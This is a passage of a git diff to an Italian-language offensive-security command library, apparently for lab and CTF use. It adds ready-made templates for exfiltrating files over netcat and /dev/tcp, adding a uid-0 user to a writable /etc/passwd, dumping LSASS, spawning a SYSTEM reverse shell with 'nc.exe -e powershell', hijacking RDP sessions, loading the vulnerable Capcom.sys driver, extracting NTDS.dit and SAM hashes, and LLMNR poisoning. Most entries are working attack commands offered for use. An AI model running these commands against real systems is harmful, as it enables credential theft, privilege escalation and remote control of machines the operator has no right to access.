-    "template": "# sul ricevente: resta in ascolto e scrive quello che arriva su file\nnc -lvnp 9999 > file\n\n# sul mittente: invia il file al ricevente\nnc <ip> 9999 < file",
+    "template": "nc -lvnp <lport> > <file>",
     "params": [
       {
         "key": "ip",
-        "label": "Destinatario",
+        "label": "Target",
         "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "lhost",
+        "label": "LHOST (tu)",
         "placeholder": "10.10.14.5"
       },
       {
-        "key": "b64",
-        "label": "Stringa base64",
-        "placeholder": "H4sIAAA..."
+        "key": "lport",
+        "label": "Porta",
+        "placeholder": "9001"
+      },
+      {
+        "key": "file",
+        "label": "File",
+        "placeholder": "loot.tar"
       }
     ],
     "variants": [
       {
         "id": "default",
-        "label": "netcat",
-        "template": "# sul ricevente: resta in ascolto e scrive quello che arriva su file\nnc -lvnp 9999 > file\n\n# sul mittente: invia il file al ricevente\nnc <ip> 9999 < file",
-        "description": "Receiver in ascolto, sender invia il file."
+        "label": "Ricevi (listener)",
+        "template": "nc -lvnp <lport> > <file>",
+        "description": "Ascolta e scrive su file quello che arriva."
       },
       {
-        "id": "base64",
-        "label": "base64",
-        "template": "# sulla sorgente: codifica il file in una riga sola da copiare\nbase64 -w0 file\n\n# sulla destinazione: decodifica la riga e ricostruisce il file\necho \"<b64>\" | base64 -d > file",
-        "description": "Per file piccoli; su Windows `certutil -decode encoded.txt file`."
+        "id": "send",
+        "label": "Invia a listener",
+        "template": "nc <ip> <lport> < <file>",
+        "description": "Invia un file al listener."
+      },
+      {
+        "id": "ncat",
+        "label": "Ncat (recv-only)",
+        "template": "ncat -l -p <lport> --recv-only > <file>",
+        "description": "Ncat chiude la connessione a fine ricezione."
+      },
+      {
+        "id": "reverse",
+        "label": "Reverse transfer",
+        "template": "# firewall blocca l'ingresso verso la vittima: inverti i ruoli\n# lato tuo (attacker): invia il file restando in ascolto\nsudo nc -lvnp <lport> -q 0 < <file>\n\n# lato target: connettiti e ricevi\nnc <lhost> <lport> > <file>",
+        "description": "Quando le connessioni in ingresso verso la vittima sono bloccate."
       }
     ]
+  },
+  {
+    "id": "ft-devtcp",
+    "name": "/dev/tcp (bash puro)",
+    "category": "post-exp",
+    "subcategory": "file-transfer",
+    "group": "Bidirezionale / senza tool",
+    "description": "Trasferimento TCP con la sola bash, quando mancano wget/curl/nc (shell minima, container, chroot).",
+    "platform": "linux",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [],
+    "tags": [
+      "file-transfer",
+      "dev-tcp",
+      "bash"
+    ],
+    "template": "cat < /dev/tcp/<lhost>/<lport> > <file>",
+    "params": [
+      {
+        "key": "lhost",
+        "label": "LHOST (tu)",
+        "placeholder": "10.10.14.5"
+      },
+      {
+        "key": "lport",
+        "label": "Porta",
+        "placeholder": "443"
+      },
+      {
+        "key": "file",
+        "label": "File",
+        "placeholder": "loot.tar"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Ricevi file",
+        "template": "cat < /dev/tcp/<lhost>/<lport> > <file>",
+        "description": "Riceve da un nc che invia dal lato tuo (`nc -lvnp <lport> -q0 < file`)."
+      },
+      {
+        "id": "http",
+        "label": "HTTP GET raw",
+        "template": "# apri una connessione TCP verso il webserver\nexec 3<>/dev/tcp/<lhost>/<lport>\n\n# invia la richiesta HTTP GET\necho -e \"GET /<file> HTTP/1.1\\n\\n\" >&3\n\n# leggi la risposta (include gli header: da ripulire)\ncat <&3",
+        "description": "Scarica via HTTP raw senza tool esterni."
+      }
+    ],
+    "note": "# Quando\nSolo bash, nessun tool esterno. La stessa tecnica vale anche per esfiltrare dall'host compromesso verso di te."
+  },
+  {
+    "id": "ft-base64",
+    "name": "base64 (copia-incolla)",
+    "category": "post-exp",
+    "subcategory": "file-transfer",
+    "group": "Bidirezionale / senza tool",
+    "description": "Per canali solo-testo (web shell, terminale remoto) o senza rete: codifica il file in base64, incolla, decodifica dall'altro lato. Pratico solo per file piccoli (es. chiavi SSH).",
+    "platform": "cross-platform",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [],
+    "tags": [
+      "file-transfer",
+      "base64",
+      "no-tool"
+    ],
+    "template": "base64 -w0 <file>; echo",
+    "params": [
+      {
+        "key": "file",
+        "label": "File",
+        "placeholder": "id_rsa"
+      },
+      {
+        "key": "b64",
+        "label": "Base64",
+        "placeholder": "H4sIAAAA..."
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Codifica (sorgente)",
+        "template": "base64 -w0 <file>; echo",
+        "description": "Stampa il file in una riga sola da copiare."
+      },
+      {
+        "id": "decode",
+        "label": "Decodifica (Linux)",
+        "template": "echo \"<b64>\" | base64 -d > <file>",
+        "description": "Ricostruisce il file dalla stringa incollata."
+      },
+      {
+        "id": "windecode",
+        "label": "Decodifica (Windows)",
+        "template": "powershell -c \"[IO.File]::WriteAllBytes('C:\\Windows\\Temp\\<file>',[Convert]::FromBase64String('<b64>'))\"",
+        "description": "Decodifica base64 lato Windows in PowerShell."
+      }
+    ],
+    "note": "# Verifica\nControlla l'integrità con `md5sum <file>` (Linux) o `Get-FileHash` (Windows) sui due lati: devono combaciare. Adatto a file piccoli."
   },
   {
     "id": "linpeas",
@@ -10665,6 +12289,11 @@ const COMMANDS = [
         "key": "binary",
         "label": "Binario SUID",
         "placeholder": "/usr/bin/find"
+      },
+      {
+        "key": "pwhash",
+        "label": "Hash password (openssl)",
+        "placeholder": "$1$abc$..."
       }
     ],
     "variants": [
@@ -10685,6 +12314,12 @@ const COMMANDS = [
         "label": "SO injection",
         "template": "strace <binary> 2>&1 | grep \"No such file\"",
         "description": "Quando il binario SUID carica una `.so` mancante, quella libreria va creata con il payload al suo interno."
+      },
+      {
+        "id": "etcpasswd",
+        "label": "/etc/passwd scrivibile",
+        "template": "# /etc/passwd scrivibile? (misconfig: a volte è RW dal tuo utente)\nls -l /etc/passwd\n\n# genera l'hash di una password a tua scelta (formato crypt)\nopenssl passwd 'pwn'\n\n# aggiungi una riga con uid 0 (root-equivalente) usando l'hash generato\necho 'pwn:<pwhash>:0:0:root:/root:/bin/bash' >> /etc/passwd\n\n# diventa root con la password scelta\nsu pwn",
+        "description": "Vettore distinto dal SUID ma dallo stesso check «cosa posso scrivere». Se `/etc/passwd` è scrivibile, aggiungi un utente con `uid 0` e un hash che conosci (`openssl passwd`), poi `su` verso quell'utente: sei root. Funziona perché Linux legge ancora l'hash da `/etc/passwd` se presente nel secondo campo."
       }
     ]
   },
@@ -10993,7 +12628,7 @@ const COMMANDS = [
     "category": "privesc-windows",
     "subcategory": "token-priv",
     "group": "Windows",
-    "description": "Mostra i privilegi del token. I più sfruttabili: `SeImpersonatePrivilege`, `SeBackupPrivilege`, `SeTakeOwnershipPrivilege`, `SeLoadDriverPrivilege`.",
+    "description": "Mostra i privilegi del token. I più sfruttabili:\n<ul><li><code>SeImpersonatePrivilege</code></li><li><code>SeBackupPrivilege</code></li><li><code>SeTakeOwnershipPrivilege</code></li><li><code>SeLoadDriverPrivilege</code></li></ul>",
     "note": "# Cosa osservare\nSeImpersonate e SeAssignPrimaryToken abilitano i Potato verso SYSTEM; SeBackup/SeRestore leggono SAM e NTDS; SeDebug la memoria di LSASS; SeLoadDriver carica driver vulnerabili.",
     "platform": "windows",
     "requires": [
@@ -11088,6 +12723,119 @@ const COMMANDS = [
         "description": "Assegna la proprietà del file all'account corrente, che poi si concede il Full Control."
       }
     ]
+  },
+  {
+    "id": "sedebug",
+    "name": "SeDebug — LSASS dump / RCE SYSTEM",
+    "category": "privesc-windows",
+    "subcategory": "token-priv",
+    "group": "Windows",
+    "description": "`SeDebugPrivilege` apre la memoria di qualunque processo. Due usi distinti: dumpare LSASS per estrarne le credenziali, oppure creare un processo figlio che eredita il token di un processo SYSTEM (es. winlogon), ottenendo SYSTEM diretto. Tipico di account di servizio e di sessioni di debug.",
+    "note": "# Primary token, non impersonation\nSeDebug si attiva solo da un primary token. Se `whoami /priv` lo mostra `Disabled` e psgetsys fallisce, sei in un impersonation token (tipico delle shell via Invoke-Command): il privilegio compare ma non si abilita. Diagnosi: `[System.Diagnostics.Process]::EnterDebugMode()` → se solleva eccezione serve una sessione reale. Rientra con Evil-WinRM o RunasCs (creano un primary token via LogonUser), non con Invoke-Command.\n# Dump LSASS\nIl `.dmp` si porta offline e si parsa con pypykatz/mimikatz `sekurlsa::minidump` (vedi Post-Exploitation → mimikatz). La variante fileless usa il LOLBin `comsvcs.dll`.\n# Prossimo passo\nLa via token dà SYSTEM subito; la via LSASS dà hash/password da riusare su altri servizi.",
+    "platform": "windows",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [],
+    "tags": [
+      "sedebug",
+      "lsass",
+      "procdump",
+      "token"
+    ],
+    "template": ".\\procdump.exe -accepteula -ma lsass.exe lsass.dmp",
+    "params": [
+      {
+        "key": "pid",
+        "label": "PID SYSTEM (winlogon)",
+        "placeholder": "612"
+      },
+      {
+        "key": "lhost",
+        "label": "LHOST",
+        "placeholder": "10.10.14.5"
+      },
+      {
+        "key": "lport",
+        "label": "LPORT",
+        "placeholder": "443"
+      }
+    ],
+    "variants": [
+      {
+        "id": "procdump",
+        "label": "Dump LSASS (procdump)",
+        "template": ".\\procdump.exe -accepteula -ma lsass.exe lsass.dmp",
+        "description": "Dump completo di LSASS. Portalo offline e parsalo con pypykatz/mimikatz per hash e password."
+      },
+      {
+        "id": "comsvcs",
+        "label": "Dump LSASS (fileless)",
+        "template": "tasklist | findstr lsass\nrundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump <pid> C:\\Temp\\lsass.dmp full",
+        "description": "Usa il LOLBin comsvcs.dll al posto di procdump. <pid> = PID di lsass.exe."
+      },
+      {
+        "id": "rce",
+        "label": "RCE come SYSTEM (token)",
+        "template": "tasklist | findstr winlogon\nipmo .\\psgetsys.ps1\nImpersonateFromParentPid -ppid <pid> -command \"c:\\windows\\system32\\cmd.exe\" -cmdargs \"/c nc.exe <lhost> <lport> -e powershell\"",
+        "description": "Crea un processo che eredita il token di winlogon (SYSTEM). <pid> = PID di winlogon. Richiede un primary token (vedi nota)."
+      }
+    ]
+  },
+  {
+    "id": "tscon-hijack",
+    "name": "tscon — RDP session hijack",
+    "category": "privesc-windows",
+    "subcategory": "token-priv",
+    "group": "Windows",
+    "description": "Con privilegi SYSTEM si può dirottare la sessione RDP/console di un altro utente (anche admin o di dominio) senza conoscerne la password.",
+    "platform": "windows",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [
+      "rdp"
+    ],
+    "tags": [
+      "tscon",
+      "rdp",
+      "session-hijack",
+      "privesc"
+    ],
+    "template": "query user",
+    "params": [
+      {
+        "key": "id",
+        "label": "Session ID",
+        "placeholder": "2"
+      },
+      {
+        "key": "sessionname",
+        "label": "Tua sessione",
+        "placeholder": "rdp-tcp#1"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Elenca sessioni",
+        "template": "query user",
+        "description": "Mostra sessioni e stato (Active/Disc): punta a una sessione admin disconnessa e prendi il suo ID."
+      },
+      {
+        "id": "hijack",
+        "label": "Hijack (da SYSTEM)",
+        "template": "tscon <id> /dest:<sessionname>",
+        "description": "Da SYSTEM sposta la sessione <id> sulla tua (<sessionname>) senza password."
+      },
+      {
+        "id": "service",
+        "label": "Via servizio (ottieni SYSTEM)",
+        "template": "# se non sei SYSTEM ma sei admin: crea un servizio che lancia tscon come SYSTEM\nsc create svchijack binpath= \"cmd.exe /k tscon <id> /dest:rdp-tcp#1\"\nsc start svchijack",
+        "description": "Da admin a SYSTEM: un servizio esegue tscon con l'account SYSTEM."
+      }
+    ],
+    "note": "# Come funziona\n`query user` elenca le sessioni. `tscon <id> /dest:<tua>` richiede SYSTEM e sposta la sessione altrui sulla tua, senza password. Se sei admin ma non SYSTEM, usa la variante a servizio (i servizi partono come SYSTEM)."
   },
   {
     "id": "dnsadmins-dll",
@@ -11197,6 +12945,124 @@ const COMMANDS = [
     ]
   },
   {
+    "id": "print-operators",
+    "name": "Print Operators — SeLoadDriver, SYSTEM",
+    "category": "privesc-windows",
+    "subcategory": "priv-groups",
+    "group": "Windows",
+    "description": "Il gruppo `Print Operators` concede `SeLoadDriverPrivilege`: si carica un driver kernel vulnerabile (Capcom.sys) che disabilita la protezione del kernel e consente l'esecuzione di codice come SYSTEM.",
+    "note": "# Come funziona\nSi registra il driver sotto una chiave in HKCU, si abilita il privilegio (EnableSeLoadDriverPrivilege o EoPLoadDriver), poi si sfrutta Capcom.sys con ExploitCapcom. `\\??\\` è un NT Object Path risolto da Windows.\n# Attenzione\nCapcom.sys è firmato ma vulnerabile: con HVCI o la Driver Blocklist di Windows attivi il caricamento fallisce.",
+    "platform": "windows",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [],
+    "tags": [
+      "print-operators",
+      "seloaddriver",
+      "capcom",
+      "driver"
+    ],
+    "template": "reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v ImagePath /t REG_SZ /d \"\\??\\C:\\Tools\\Capcom.sys\"\nreg add HKCU\\System\\CurrentControlSet\\CAPCOM /v Type /t REG_DWORD /d 1",
+    "params": [],
+    "variants": [
+      {
+        "id": "register",
+        "label": "Registra driver",
+        "template": "reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v ImagePath /t REG_SZ /d \"\\??\\C:\\Tools\\Capcom.sys\"\nreg add HKCU\\System\\CurrentControlSet\\CAPCOM /v Type /t REG_DWORD /d 1",
+        "description": "Scrive la chiave del driver nel registro utente. Type=1 = driver kernel."
+      },
+      {
+        "id": "load",
+        "label": "Abilita & carica",
+        "template": "EnableSeLoadDriverPrivilege.exe",
+        "description": "Abilita SeLoadDriverPrivilege nel token e carica il driver Capcom registrato."
+      },
+      {
+        "id": "exploit",
+        "label": "Exploit Capcom → SYSTEM",
+        "template": "ExploitCapcom.exe",
+        "description": "Sfrutta Capcom.sys per eseguire codice come SYSTEM."
+      },
+      {
+        "id": "eop",
+        "label": "EoPLoadDriver (automatico)",
+        "template": "EoPLoadDriver.exe System\\CurrentControlSet\\Capcom c:\\Tools\\Capcom.sys\nExploitCapcom.exe",
+        "description": "EoPLoadDriver fa registrazione, abilitazione e caricamento in un comando; poi lanci l'exploit."
+      }
+    ]
+  },
+  {
+    "id": "event-log-readers",
+    "name": "Event Log Readers — creds nei log",
+    "category": "privesc-windows",
+    "subcategory": "priv-groups",
+    "group": "Windows",
+    "description": "Il gruppo `Event Log Readers` può leggere il Security Event Log, dove a volte restano credenziali in chiaro passate sulla riga di comando (es. `net use /user:...`, `runas`). Si filtrano gli eventi 4688 (creazione processo).",
+    "note": "# Cosa cercare\nComandi con `/user` e password in chiaro nelle command line registrate. Gli eventi 4688 richiedono che l'audit della creazione processi sia attivo.\n# Prossimo passo\nOgni credenziale va riprovata su tutti i servizi: è il classico riuso che porta a lateral movement o a un account più privilegiato.",
+    "platform": "windows",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [],
+    "tags": [
+      "event-log-readers",
+      "wevtutil",
+      "credentials"
+    ],
+    "template": "wevtutil qe Security /rd:true /f:text | Select-String \"/user\"",
+    "params": [],
+    "variants": [
+      {
+        "id": "wevtutil",
+        "label": "wevtutil",
+        "template": "wevtutil qe Security /rd:true /f:text | Select-String \"/user\"",
+        "description": "Legge il Security log in ordine inverso cercando `/user`."
+      },
+      {
+        "id": "getwinevent",
+        "label": "Get-WinEvent (4688)",
+        "template": "Get-WinEvent -LogName Security | ? { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } | Select-Object @{n='CommandLine';e={$_.Properties[8].Value}}",
+        "description": "Filtra la creazione processi (4688) per command line contenenti `/user`."
+      }
+    ]
+  },
+  {
+    "id": "hyperv-admins",
+    "name": "Hyper-V Administrators — NTDS da VM",
+    "category": "privesc-windows",
+    "subcategory": "priv-groups",
+    "group": "Windows",
+    "description": "Il gruppo `Hyper-V Administrators` gestisce le macchine virtuali: se il Domain Controller è virtualizzato se ne clona o monta il disco offline e si estrae `NTDS.dit`. In alternativa, su host con servizi di terze parti vulnerabili (es. Mozilla Maintenance Service) si prende possesso del binario del servizio e lo si sostituisce con un payload.",
+    "platform": "windows",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [],
+    "tags": [
+      "hyper-v",
+      "ntds",
+      "virtualization"
+    ],
+    "template": "# DC virtualizzato: esporta/clona la VM, monta il VHDX offline, estrai NTDS.dit + hive SYSTEM\n# poi, offline, estrai gli hash di dominio:\nimpacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL",
+    "params": [],
+    "variants": [
+      {
+        "id": "ntds",
+        "label": "NTDS da disco VM",
+        "template": "# DC virtualizzato: esporta/clona la VM, monta il VHDX offline\n# estrai NTDS.dit e l'hive SYSTEM dal disco montato, poi offline:\nimpacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL",
+        "description": "Se il DC gira come VM: dal disco virtuale montato prendi `NTDS.dit` e l'hive `SYSTEM`, poi secretsdump offline per tutti gli hash di dominio."
+      },
+      {
+        "id": "mozilla",
+        "label": "Servizio host (Mozilla Maintenance)",
+        "template": "takeown /F \"C:\\Program Files (x86)\\Mozilla Maintenance Service\\maintenanceservice.exe\"\n# sostituisci il binario col payload (gira come SYSTEM), poi:\nsc start MozillaMaintenance",
+        "description": "Su host con Firefox: tramite hard-link e Mozilla Maintenance Service prendi possesso del binario (gira come SYSTEM), lo sostituisci e avvii il servizio."
+      }
+    ],
+    "note": "# Prerequisiti\nMembro di `Hyper-V Administrators`. Scenario classico: DC virtualizzato — il gruppo dà controllo sulle VM, quindi sul disco del DC. Senza VM del DC resta l'abuso di un servizio vulnerabile dell'host."
+  },
+  {
     "id": "unquoted-path",
     "name": "Servizi — unquoted path / perm deboli",
     "category": "privesc-windows",
@@ -11255,7 +13121,7 @@ const COMMANDS = [
       "accesschk",
       "privesc"
     ],
-    "template": ".\\accesschk.exe /accepteula -uwcqv <user> *",
+    "template": "# cerca i servizi su cui l'utente ha permessi di modifica\n.\\accesschk.exe /accepteula -uwcqv <user> *\n\n# stessa ricerca senza accesschk, solo con cmdlet nativi\nGet-CimInstance win32_service | ? {$_.StartName -like '*LocalSystem*'} | select Name,PathName",
     "params": [
       {
         "key": "user",
@@ -11297,6 +13163,60 @@ const COMMANDS = [
     ]
   },
   {
+    "id": "win-service-accounts",
+    "name": "Servizi & processi — account di esecuzione",
+    "category": "privesc-windows",
+    "subcategory": "vuln-services",
+    "group": "Service Abuse",
+    "description": "Elenca i servizi e i processi con l'account con cui girano, per trovare ciò che è lanciato come SYSTEM o come un amministratore: sono i bersagli per l'escalation (binari/cartelle scrivibili, unquoted path, permessi deboli).",
+    "platform": "windows",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [],
+    "tags": [
+      "service",
+      "process",
+      "privesc",
+      "enum"
+    ],
+    "template": "wmic service get name,startname,pathname,state",
+    "params": [
+      {
+        "key": "service",
+        "label": "Servizio",
+        "placeholder": "Spooler"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Servizi + account (wmic)",
+        "template": "wmic service get name,startname,pathname,state",
+        "description": "`StartName` = account del servizio: `LocalSystem` o un utente admin = bersaglio."
+      },
+      {
+        "id": "ps",
+        "label": "Servizi + account (PowerShell)",
+        "template": "Get-CimInstance Win32_Service | Select-Object Name,State,StartName,PathName | Format-Table -Auto",
+        "description": "Equivalente in PowerShell, filtrabile con `Where-Object`."
+      },
+      {
+        "id": "sc",
+        "label": "Account di un servizio",
+        "template": "sc qc <service>",
+        "description": "`SERVICE_START_NAME` mostra con quale account parte il servizio indicato."
+      },
+      {
+        "id": "proc",
+        "label": "Processi + utente",
+        "template": "tasklist /v /fo list | findstr /i \"PID Utente User\"",
+        "description": "La colonna *User Name* dice chi esegue ogni processo. In PS: `Get-Process -IncludeUserName`."
+      }
+    ],
+    "note": "# Cosa cercare\nServizi con `StartName` = `LocalSystem`/account admin e con binario o cartella **scrivibili** dal tuo utente → privilege escalation.\n# Correlati\n- `unquoted-path` e permessi servizio deboli per l'abuso vero e proprio\n- `whoami /priv` per i privilegi del tuo token"
+  },
+  {
     "id": "win-dll-hijack",
     "name": "DLL Hijacking (Windows)",
     "category": "privesc-windows",
@@ -11314,7 +13234,7 @@ const COMMANDS = [
       "hijacking",
       "privesc"
     ],
-    "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f dll -o <dll>.dll",
+    "template": "# Procmon: filtro Result = NAME NOT FOUND, Path finisce con .dll, in una cartella scrivibile\n# check scrivibilità delle cartelle nel PATH:\nfor %A in (\"%PATH:;=\";\"%\") do @icacls %A 2>nul | findstr /i \"Everyone BUILTIN\\Users AUTORITA\"",
     "params": [
       {
         "key": "lhost",
@@ -11365,7 +13285,7 @@ const COMMANDS = [
       "registry",
       "startup"
     ],
-    "template": "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+    "template": "# autorun a livello di macchina\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\n# autorun dell'utente corrente\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\n# vista completa con Sysinternals, hash inclusi\n.\\autorunsc.exe -a * -c -h",
     "params": [],
     "variants": [
       {
@@ -11419,7 +13339,7 @@ const COMMANDS = [
       "aie",
       "msi"
     ],
-    "template": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+    "template": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
     "params": [
       {
         "key": "lhost",
@@ -11568,6 +13488,12 @@ const COMMANDS = [
         "label": "PrintNightmare",
         "template": "python3 CVE-2021-1675.py <domain>/<user>:'<password>'@<ip> '\\\\<lhost>\\share\\shell.dll'",
         "description": "`CVE-2021-1675` e `CVE-2021-34527`. Lo spooler si verifica con `impacket-rpcdump @<ip> | egrep \"MS-RPRN|MS-PAR\"`. La DLL va ospitata su una share SMB."
+      },
+      {
+        "id": "serioussam",
+        "label": "SeriousSAM (CVE-2021-36934)",
+        "template": "icacls C:\\Windows\\System32\\config\\SAM\n.\\HiveNightmare.exe\nimpacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL",
+        "description": "Se `BUILTIN\\Users` ha (RX) su SAM il sistema è vulnerabile: HiveNightmare estrae SAM/SYSTEM/SECURITY dalle shadow copy, poi secretsdump offline per gli hash locali (incluso l'Administrator)."
       }
     ]
   },
@@ -12016,7 +13942,7 @@ const COMMANDS = [
       "cypher",
       "analysis"
     ],
-    "template": "// percorso piu corto da un principale Owned verso i Domain Admins\nMATCH p=shortestPath((n {owned:true})-[*1..]->(g:Group)) WHERE g.objectid ENDS WITH '-512' RETURN p",
+    "template": "MATCH p=shortestPath((n {owned:true})-[*1..]->(g:Group)) WHERE g.objectid ENDS WITH '-512' RETURN p",
     "params": [],
     "variants": [
       {
@@ -12095,7 +14021,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "enum-auto",
     "group": "Vuln Checks",
-    "description": "Fase di check prima di attaccare: interroga il dominio per i prerequisiti dei vettori più comuni, così non si prova alla cieca. `maq` legge il MachineAccountQuota (se >= 1 si possono creare computer per RBCD/NoPac), `pre2k` trova computer con password uguale al nome, `signing` elenca gli host senza SMB signing (bersagli da relay), `vulns` lancia in un colpo i moduli per Zerologon, NoPac, PrintNightmare e coercion.",
+    "description": "Fase di check prima di attaccare: interroga il dominio per i prerequisiti dei vettori più comuni, così non si prova alla cieca.\n<ul><li><code>maq</code> — MachineAccountQuota (se ≥ 1 puoi creare computer per RBCD/NoPac)</li><li><code>pre2k</code> — computer con password uguale al nome</li><li><code>signing</code> — host senza SMB signing (bersagli da relay)</li><li><code>vulns</code> — moduli per Zerologon, NoPac, PrintNightmare e coercion</li></ul>",
     "note": "# Prossimo passo\nCheck mirati prima di attaccare: MachineAccountQuota (NoPac/RBCD), account pre-Windows 2000, SMB signing (relay). Se il prerequisito manca eviti di provare alla cieca un vettore impossibile.",
     "platform": "linux",
     "requires": [
@@ -12247,7 +14173,7 @@ const COMMANDS = [
       "groups",
       "enum"
     ],
-    "template": "# tutti i gruppi del dominio\nGet-DomainGroup | select name,distinguishedname\n\n# membri effettivi di un gruppo privilegiato (ricorsivo)\nGet-DomainGroupMember -Identity \"Domain Admins\" -Recurse | select MemberName",
+    "template": "Get-DomainGroup | select name,distinguishedname | sort name",
     "params": [
       {
         "key": "computer",
@@ -12297,7 +14223,7 @@ const COMMANDS = [
       "delegation",
       "enum"
     ],
-    "template": "# computer vivi con OS e hostname\nGet-DomainComputer -Ping -Properties OperatingSystem,DnsHostName | sort DnsHostName\n\n# delega NON vincolata (unconstrained)\nGet-DomainComputer -Unconstrained | select name,dnshostname\n\n# delega vincolata (constrained)\nGet-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto",
+    "template": "Get-DomainComputer -Ping -Properties OperatingSystem,DnsHostName | sort DnsHostName",
     "params": [],
     "variants": [
       {
@@ -12341,7 +14267,7 @@ const COMMANDS = [
       "pillaging",
       "enum"
     ],
-    "template": "# share raggiungibili (accesso verificato)\nFind-DomainShare -CheckShareAccess\n\n# file interessanti nelle share accessibili\nFind-InterestingDomainShareFile -Include *pass*,*cred*,*.config,*.xml",
+    "template": "Find-DomainShare -CheckShareAccess",
     "params": [],
     "variants": [
       {
@@ -12379,7 +14305,7 @@ const COMMANDS = [
       "ou",
       "enum"
     ],
-    "template": "# tutti i GPO\nGet-DomainGPO | select displayname,distinguishedname\n\n# OU del dominio\nGet-DomainOU -Properties name | sort name\n\n# GPO che toccano gruppi locali (Restricted Groups / GPP)\nGet-DomainGPOLocalGroup | select GPODisplayName,GroupName",
+    "template": "Get-DomainGPO | select displayname,distinguishedname | sort displayname",
     "params": [],
     "variants": [
       {
@@ -12423,7 +14349,7 @@ const COMMANDS = [
       "forest",
       "enum"
     ],
-    "template": "# trust del dominio corrente\nGet-DomainTrust\n\n# mapping ricorsivo di tutti i trust del forest\nGet-DomainTrustMapping",
+    "template": "Get-DomainTrust",
     "params": [],
     "variants": [
       {
@@ -12461,7 +14387,7 @@ const COMMANDS = [
       "rsat",
       "enum"
     ],
-    "template": "# dominio e DC\nGet-ADDomain; Get-ADDomainController\n\n# utenti con SPN (Kerberoast) e description sospetta\nGet-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName\nGet-ADUser -Filter 'Description -like \"*pass*\"' -Properties Description | select Name,Description\n\n# membri di un gruppo privilegiato\nGet-ADGroupMember -Identity \"Domain Admins\" -Recursive",
+    "template": "Get-ADDomain; Get-ADDomainController",
     "params": [],
     "variants": [
       {
@@ -12899,8 +14825,7 @@ const COMMANDS = [
     "category": "active-directory",
     "subcategory": "enum-manual",
     "group": "Recycle Bin",
-    "description": "Enumera e ripristina gli account eliminati. Serve quando un template ADCS mostra Enrollment Rights per un SID senza nome, ciòè un account cancellato: ripristinandolo il path torna percorribile. Il restore richiede il diritto `DS-Reanimate-Tombstones`.",
-    "note": "# Prossimo passo\nServe quando un template ADCS mostra Enrollment Rights per un SID senza nome (account cancellato): ripristinandolo il permesso torna utilizzabile. Enumera gli oggetti eliminati e ripristina quello che serve.",
+    "description": "Enumera e ripristina gli account eliminati. Serve quando un template ADCS mostra **Enrollment Rights** per un SID senza nome, ciòè un account cancellato: ripristinandolo il path torna percorribile. Il restore richiede il diritto `DS-Reanimate-Tombstones`.",
     "platform": "cross-platform",
     "requires": [
       "password"
@@ -12913,7 +14838,7 @@ const COMMANDS = [
       "deleted-objects",
       "tombstone"
     ],
-    "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' get writable",
+    "template": "# oggetti su cui hai permesso di scrittura: i cancellati ci sono di default (--exclude-del per ometterli)\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' get writable\n\n# ripristina dal cestino di AD l'oggetto scelto\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set restore <target>",
     "params": [
       {
         "key": "ip",
@@ -12970,7 +14895,8 @@ const COMMANDS = [
         "label": "bloodyAD — wiki",
         "url": "https://github.com/CravateRouge/bloodyAD/wiki"
       }
-    ]
+    ],
+    "note": "# Prossimo passo\nServe quando un template ADCS mostra **Enrollment Rights** per un SID senza nome (account cancellato): ripristinandolo il permesso torna utilizzabile. Enumera gli oggetti eliminati e ripristina quello che serve."
   },
   {
     "id": "responder",
@@ -13018,6 +14944,44 @@ const COMMANDS = [
       {
         "label": "HackTricks — LLMNR/NBT-NS poisoning",
         "url": "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.html"
+      }
+    ]
+  },
+  {
+    "id": "inveigh",
+    "name": "Inveigh — LLMNR/NBT-NS poisoning (Windows)",
+    "category": "active-directory",
+    "subcategory": "initial-access",
+    "group": "Poisoning",
+    "description": "L'equivalente Windows di Responder, da usare quando il foothold è un host Windows e non una macchina Kali: avvelena LLMNR/NBT-NS/mDNS e cattura i NetNTLMv2 di chi tenta di autenticarsi. La versione PowerShell è comoda ma rumorosa (AMSI); InveighZero (C#) è la build moderna e più stealth.",
+    "note": "# Quando usarlo\nAl posto di Responder quando sei già su un host Windows interno e non vuoi portare traffico su Kali. Gli hash NetNTLMv2 si craccano offline in hashcat mode 5600.\n# Output\nInveighZero scrive gli hash su file nella cartella di lavoro; a runtime `GET NTLMV2` li elenca in console.",
+    "platform": "windows",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [
+      "ntlm"
+    ],
+    "tags": [
+      "inveigh",
+      "llmnr",
